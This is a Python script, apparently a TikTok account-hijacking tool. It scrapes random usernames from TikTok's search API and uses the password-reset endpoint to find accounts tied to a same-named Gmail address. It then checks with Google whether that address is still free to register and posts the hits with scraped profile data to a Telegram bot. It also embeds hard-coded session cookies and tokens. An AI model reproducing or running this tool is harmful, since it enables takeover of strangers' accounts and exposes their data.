
import time
import os

import datetime

os.system('clear')
import requests,random,os,uuid,json,sys,socket,datetime
from datetime import date
from time import sleep
from user_agent import generate_user_agent
from uuid import uuid4
import mechanize,time,threading
from os import system
import requests
from bs4 import BeautifulSoup
from datetime import datetime
from cfonts import render
bb = 'qwertyuiopasdfghjklzxcvbnm123456.7890'

SS11=0
CLL=0
NICE=0
E1=0
j1=0
Ib=0
vv="56789"
G = "\033[1;32m"
R = "\033[1;31m"
P = '\x1b[1;97m'
Y = '\033[1;34m' #ازرق فاتح
Ah = '\033[2;36m'#سمائي
F = '\033[2;32m' #اخضر
G = "\033[1;32m"
R = "\033[1;31m"
G = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'#ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
E = '\033[1;31m'
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
G = '\033[1;35m'
C1 = '\033[2;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
A = '\033[2;34m'#ازرق
import requests
ip = requests.get("https://api.ipify.org").text
NK= input (f'{F}YOUR {Y}age  :{Z}')
print ('Welcome : '+ NK)
banr  =  f'''{A}[ {S}TIKTOK-v1{A} ]
{F}--------------------------
{F}|{B}[ {X}age   {Y}] : {B}{NK}{F}     |
|{M}[ {B}Tele {E}] : {M} @SX_9_O{F}  |
|{M}[{X} YOYR IP  {F} ]   : {F} {ip}{F}    |
{F}--------------------------'''
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0003)
os.system('clear')
import sys
def k(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.003)
v=0
import os
print('')
banr  = f'''
._                                            ,
               ()..                                    ,.-')
                (',.)-..                            ,.-(..)
                 (,.' ,.)-..                    ,.-(. .. )
                  (,.' ..' .)-..            ,.-( .. .. )
                   (,.' ,.'  ..')-.     ,.-( . .. .. )
                    (,.'  ,.' ,.'  )-.-('   . .. .. )
                     ( ,.' ,.'    _== ==_     .. .. )
                      ( ,.'   _==' ~  ~  ==_    .. )
                       \  _=='   ----..----  ==_   )
                    ,.-:    ,----_.  ._----.    -..
                ,.-'   (   _--====_  \/  _====--_   )  -..
            ,.-'   ..'.  -_I0_-'    -_0I_-'  .'..  -..
        ,.-'.'   .'      (          |  |          )      .   .-..
    ,.-'    :    _--- '..    /  \    ..' ---___'    :   -..
  -'___-__' \  (O)  (O)  / __-'__-
                              \ . _  __  _ . /
                               \ V-'  `-V' |
                                | \ \ | /  /
                                 V \ ~| ~/V
                                  |  \  /|
                                   \~ | V  
                                    \  |
                                     VV
""")⠀'''
print(banr)
k(X+' ────━◜◝━───── ')
print('')


tokeen = input(f' {F}({C}1{F}){B} [TOKEN] {X} : {F}  '+R)
k(X+' ────━◜◝━─────')
print('')
IDD = input(f' {F}({C}2{F}){B}[ID]{X} : {F}  '+R)
k(X+' ────━◜◝━─────')
print('')

class DaddyGivt():
    def __init__(self,user):
        self.username =user
        if self.username[0] == "@" or "@" in self.username:
            self.username.replace("@", "")
        self.server_log = None
        self.data_json = None
        self.admin()

    def admin(self):
        self.send_request()
        self._to_json()
        self.output()

    def send_request(self):
        headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"}
        r = requests.get(f"https://www.tiktok.com/@{self.username}", headers=headers)
        self.server_log = str(r.text)
        return r.text

    def _to_json(self):
        try:
            soup = BeautifulSoup(self.server_log, 'html.parser')
            script = soup.find(id='SIGI_STATE').contents
            data = str(script).split('},"UserModule":{"users":{')[1]
            self.data_json = data
            return 1
        except IndexError:
            input("[X] Error : Username Not Found .")
            exit()

    def get_user_id(self):
        try:
            data = self.data_json
            return data.split('"id":"')[1].split('",')[0]
        except IndexError:
            return "Unknown"

    def get_name(self):
        try:
            data = self.data_json
            return data.split(',"nickname":"')[1].split('",')[0]
        except IndexError:
            return "Unknown"

    def is_verified(self):
        try:
            data = self.data_json
            check = data.split('"verified":')[1].split(',')[0]
            if check == "false":
                return "No"
            else:
                return "Yes"
        except IndexError:
            return "Unknown"

    def secUid(self):
        try:
            data = self.data_json
            check = data.split(',"secUid":"')[1].split('"')[0]
            return check
        except IndexError:
            return "Unknown"

    def is_private(self):
        try:
            data = self.data_json
            check = data.split('"privateAccount":')[1].split(',')[0]
            if check == "true":
                return "Yes"
            else:
                return "No"
        except IndexError:
            return "Unknown"

    def followers(self):
        try:
            data = self.data_json
            check = data.split('"followerCount":')[1].split(',')[0]
            return check
        except IndexError:
            return "Unknown"

    def following(self):
        try:
            data = self.data_json
            check = data.split('"followingCount":')[1].split(',')[0]
            return check
        except IndexError:
            return "Unknown"

    def user_create_time(self):
        try:
            url_id = int(self.get_user_id())
            binary = "{0:b}".format(url_id)
            i = 0
            bits = ""
            while i < 31:
                bits += binary[i]
                i += 1
            timestamp = int(bits, 2)
            dt_object = datetime.fromtimestamp(timestamp)
            return dt_object
        except:
            return "Unknown"

    def last_change_name(self):
        try:
            data = self.data_json
            time = data.split('"nickNameModifyTime":')[1].split(',')[0]
            check = datetime.fromtimestamp(int(time))
            return check
        except IndexError:
            return "Unknown"

    def account_region(self):
        try:
            data = self.data_json
            check = data.split('"region":"')[1].split('"')[0]
            return check
        except IndexError:
            return "Unknown"
     

    def output(self):

        suii=f"""
𝗛𝗜 𝗡𝗘𝗪 
⋘─────━◜◝━─────⋙
𝗡𝗮𝗺𝗘  : {self.get_name()}
𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 :  {self.followers()}
𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 :  {self.following()}
𝗜𝗦 𝗣𝗥𝗜𝗩𝗮𝗧𝗘 : {self.is_private()}
 𝗨𝗦𝗘𝗥 𝗜𝗗 : {self.get_user_id()}
𝗗𝗮𝗧𝗘  : {self.user_create_time()}
⋘─────━◜◝━─────⋙
[🇮🇶] TeleGram : @O23_k  """

        tlg =(f'https://api.telegram.org/bot{tokeen}/sendMessage?chat_id={IDD}&text={suii}')
        ru= requests.post(tlg)
def CLAF():
 he3 = {
'user-agent': str(generate_user_agent()),
}
 CC22Y = requests.get('https://www.tiktok.com/',headers=he3)
 pr = CC22Y.cookies.get_dict()

 h = pr['ttwid']

 CC22Y = requests.get('https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.84&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=CC22Y&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=ar&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=he3)
 pr = CC22Y.cookies.get_dict()
 u = pr['msToken']
 os.system('clear')
 global bb,vv,IIDDD,tokeeen,Ib,j1,E1,NICE,CLL,SS11,asu
 while True:     
  wk=int(''.join(random.choice(vv) for i in range(1)))
  username = str(''.join(random.choice(bb)for i in range(wk)))
  url=f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.8&browser_language=ar-EG&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7167115569976100357&device_platform=web_pc&focus_state=true&from_page=search&history_len=5&is_fullscreen=false&is_page_visible=true&keyword={username}&os=windows&priority_region=&referer=&region=IQ&screen_height=864&screen_width=1536&tz_name=Asia%2FBaghdad&webcast_language=ar&msToken=KUTYcDl8obce6sFgarFzTuyTp-uxz8sU5cFUq8fRme8gW7CZGE6IZyE04u9ugaO2fHPnE4oeSshscAF2kdNp43hjOfwbTaGSnH8ExR0LPs9VmBMkHykqXbOwL8XLgu3hMkdEin3jkM1d4ZBE&X-Bogus=DFSzswVLK1sANG9HSkI1-OYklT6o&_signature=_02B4Z6wo00001LRkx7AAAIDBahKfFq1mHTi0ZMMAAE696a'
  head11 = {
'accept': '*/*',
'accept-language':'ar-AE,ar-IQ;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
'cookie':'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent={"ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"}; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988={"user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"}; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,;tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFNICEIY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt=9392403db19bcfc1eb8eb48532fd8d5e; uid_tt_ss=9392403db19bcfc1eb8eb48532fd8d5e; sid_tt=5d52768f6a4a876314ea37244edfd0d0; sessionid=5d52768f6a4a876314ea37244edfd0d0; sessionid_ss=5d52768f6a4a876314ea37244edfd0d0; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid='+h+';odin_tt=70015f10b12827e4d2b9cce32ead78da9CLLf5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken='+u+'; msToken='+u+'; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
'referer': 'https://www.tiktok.com/search/user?q=its.veba&t=1671705430400',
'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
  y= requests.get(url,headers=head11).json()
  try:
   iddd = len(str(y['user_list'][0]['user_info']['unique_id']))
   for ll in range(0,iddd):
    try:
     nn = str(y['user_list'][ll]['user_info']['unique_id'])
     email = nn+"@gmail.com"
     url = "https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1656747775&as=a1e67fbb4fffb246cf0244&cp=f2f02d6bfbffb36de1emw&mas=01cd120efcb179ac1b331e5cecb80282052c2c4c0c66c66c2c4c46"
     headers = {
            'host':'api2-19-h2.musical.ly',
            'connection':'keep-alive',
            'cookie':'sstore-idc=maliva; store-country-code=iq; odin_tt=056f31c10f8c82638f6d4d64669ad49e9c36d4946d5d596f433d7f2d75fa1592a21c201d712196d54ee4ae4e14ac8708eee32dc97c85c0a65510024ecc0698346f73ecab038b7160dbff96ced716b8af',
            'accept-Encoding':'gzip',
             'user-agent':'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ; SM-A022F; Build/RP1A.200720.012; Cronet/58.0.2991.0)',
              'connection': 'close',}
     data = f"app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233"
     re = requests.post(url,headers=headers,data=data)
     if 'Bind device by email failed' in re.text:
      os.system('cls'if os.name=='net'else'clear')
      SS11+=1
      print(f"\033[1;31m{banr}\n\n{C}‹─────\033[1;30m  \033[2;35m ─────›  \033[1;35\n\n\033[2;32m  GOOD : {NICE} \n\n\033[1;31m  BAD : {SS11} \n\n\033[2;36m  EMAIL����: {email} \n\n\033[1;36m{C}‹─────\033[1;30m \033[2;35m ─────›  \033[1;35\n\n\033[2;32m")
      
     elif 'Sent successfully' in re.text:
      headers = {
           'Content-Length':'98',
           'Content-Type':'text/plain; charset=UTF-8',
           'Host':'android.clients.google.com',
           'Connection':'Keep-Alive',
           'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
      }
      data = json.dumps({'username':f'{email}',
           'version':'3',
           'firstName':'CLAF',
           'lastName':'Codeing'})
      res=requests.post('https://android.clients.google.com/setup/checkavail',headers=headers,data=data)
      if res.json()['status'] =='USERNAME_UNAVAILABLE':
       os.system('cls'if os.name=='net'else'clear')
       CLL+=1
       print(f"\033[1;31m{banr}\n\n{C}‹─────\033[1;30m  \033[2;35m ─────›  \033[1;35\n\n\033[2;32m  GOOD : {NICE} \n\n\033[1;31m  BAD : {SS11} \n\n\033[2;36m  EMAIL : {email} \n\n\033[1;36m{C}‹─────\033[1;30m \033[2;35m ─────›  \033[1;35\n\n\033[2;32m ")

      elif res.json()['status'] =='SUCCESS':
       NICE+=1
       print(f"\033[1;31m{banr}\n\n{C}‹─────\033[1;30m  \033[2;35m ─────›  \033[1;35\n\n\033[2;32m  GOOD : {NICE} \n\n\033[1;31m  BAD : {SS11} \n\n\033[2;36m  EMALI : {email} \n\n\033[1;36m{C}‹─────\033[1;30m  \033[2;35m ─────›  \033[1;35\n\n\033[2;32m")
       user = email.split("@gmail.com")[0]
       DaddyGivt(f'{user}')
       tlg =(f'https://api.telegram.org/bot{tokeen}/sendMessage?chat_id={IDD}&text=✠ - 𝗘𝗺𝗮𝗜𝗟 :  {email}')
       ru= requests.post(tlg)
       break
         
         
       
    except IndexError:
     pass
  except IndexError:
   pass
Threads=[] 
for t in range(2):
 x = threading.Thread(target=CLAF)
 x.start()
 Threads.append(x)
for Th in Threads:
 Th.join() 